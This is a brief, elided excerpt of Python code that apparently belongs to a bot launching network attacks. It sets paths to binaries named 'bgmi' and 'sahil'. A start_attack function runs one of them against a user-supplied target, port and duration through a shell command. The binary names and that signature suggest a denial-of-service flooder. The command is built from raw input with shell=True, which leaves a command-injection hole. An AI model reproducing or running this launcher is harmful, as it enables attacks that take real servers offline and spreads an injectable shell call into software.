...
ORIGINAL_BGMI_PATH = '/workspaces/New1/bgmi'      #ADD YOUR FILES PATH HERE 
ORIGINAL_SAHIL_PATH = '/workspaces/New1/sahil'    #ADD YOUR FILES PATH HERE 
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ...
        time.sleep(5)
        subprocess.run(f"./{sahil_file} {target} {port} {duration}", shell=True)
